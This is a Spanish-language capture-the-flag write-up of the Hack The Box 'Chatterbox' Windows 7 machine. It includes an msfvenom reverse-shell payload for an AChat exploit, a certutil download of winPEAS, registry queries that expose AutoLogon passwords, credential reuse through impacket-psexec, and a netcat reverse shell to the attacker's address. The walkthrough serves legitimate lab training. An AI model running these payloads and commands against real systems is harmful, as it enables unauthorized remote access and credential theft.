---
title: Chatterbox -  Medium (HTB)
tags:
permalink: /Chatterbox-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p135,139,445,9255,9256,49152,49153,49154,49155,49156,49157 10.129.235.233
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-22 21:15 -0500
Nmap scan report for 10.129.235.233
Host is up (0.68s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  http         AChat chat system httpd
|_http-title: Site doesn't have a title.
|_http-server-header: AChat
9256/tcp  open  achat        AChat chat system
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-12-23T07:18:17
|_  start_date: 2025-12-23T07:15:04
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-12-23T02:18:20-05:00
|_clock-skew: mean: 6h41m27s, deviation: 2h53m15s, median: 5h01m25s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.55 seconds
```
## Shell as alfred
### Achat / Port 9255-6

Como veo que en el puerto `9255` y `9256` corre el servicio de `achat`  busque por vulnerabilidades y `exploit` asociados a este servicio, con lo que me cruce con este [enlace](https://tenaka.gitbook.io/pentesting/boxes/achat). El mismo solicita una cadena en `unicode`, la cual tengo que generar con `msfvenom` de la siguiente forma.

```bash
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp lhost=10.10.17.19 lport=4444 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

Y el output lo reemplazo en el script, para luego ejecutarlo, con `python2.7`, y desde mi listener recibo la conexión como el usuario `alfred`.

```powershell
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.235.233] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\alfred
```

```bash
C:\Users\Alfred\Desktop>type user.txt
type user.txt
5023088ccf063adf44f8c6182779f9ea
```
## Shell as administrator / nt system

Para enumerar el sistema subi `winPEAS` a la maquina con `certutil`.

```powershell
C:\Users\Alfred\Desktop>certutil -urlcache -split -f http://10.10.17.19/winPEASx64.exe C:\programdata\winPEASx64.exe
certutil -urlcache -split -f http://10.10.17.19/winPEASx64.exe C:\programdata\winPEASx64.exe
****  Online  ****
  000000  ...
  9b3200
CertUtil: -URLCache command completed successfully.
```

### Autologon credentials

Y luego de un rato veo que en el output del escaneo me detecto unas credenciales en el `registro`.

```powershell
����������͹ Cached Creds
� If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#cached-credentials                                                                                                                                                                                   
    cachedlogonscount is 10
```

Para consultar el registro manualmente use el siguiente comando:

```powershell
reg query HKLM /f password /t REG_SZ /s
```

O tambien 

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

Lo que me dio como resultado.

```powershell
C:\Programdata>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    ShutdownWithoutLogon    REG_SZ    0
    WinStationsDisabled    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    scremoveoption    REG_SZ    0
    ShutdownFlags    REG_DWORD    0x11
    DefaultDomainName    REG_SZ    
    DefaultUserName    REG_SZ    Alfred
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    Welcome1!

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\AutoLogonChecked
```

De todas formas en el output de `winPEAS`, también me muestra las mismas.

```powershell
����������͹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultUserName               :  Alfred
    DefaultPassword               :  Welcome1!
```

### Shell 

Veo la credencial para el usuario `Alfred` lo cual es valida, pero también probé las mismas con el usuario `administrator` para conectarme con `psexec` y también son validas.

```powershell
impacket-psexec chatterbox.htb/administrator:'Welcome1!'@10.129.235.235
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.235.235.....
[*] Found writable share ADMIN$
[*] Uploading file VczsYBOi.exe
[*] Opening SVCManager on 10.129.235.235.....
[*] Creating service sGnf on 10.129.235.235.....
[*] Starting service sGnf.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Sin embargo cuando quería visualizar el contenido de la `flag`, me salió `Access denied.`, y también trate de ver las `ADS (Alternate Data Streams)` del mismo archivo, pero no logre ver nada.

```powershell
C:\Users\Administrator\Desktop> cmd.exe /c dir /s /r C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 502F-F304

 Directory of C:\Users\Administrator\Desktop

12/10/2017  06:50 PM    <DIR>          .
12/10/2017  06:50 PM    <DIR>          ..
12/23/2025  02:48 AM                34 root.txt
               1 File(s)             34 bytes

     Total Files Listed:
               1 File(s)             34 bytes
               2 Dir(s)   3,609,681,920 bytes free

C:\Users\Administrator\Desktop> type root.txt
Access is denied.

```
### nc shell

Por lo que subí el `nc.exe` y desde la misma maquina me envié otra consola mas interactiva a mi `shell`, con el siguiente comando.

```powershell
C:\programdata\nc.exe 10.10.17.19 1234 -e cmd.exe
```

Y después de recibir la conexión, ahí si pude ver la `flag`.

```powershell
sudo nc -nlvp 1234
[sudo] password for zs1n: 
listening on [any] 1234 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.235.235] 49176
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 502F-F304

 Directory of C:\Users\Administrator\Desktop

12/10/2017  06:50 PM    <DIR>          .
12/10/2017  06:50 PM    <DIR>          ..
12/23/2025  02:48 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,613,106,176 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
ed836991d731af2a342d91652100d683
```

`~Happy Hacking.`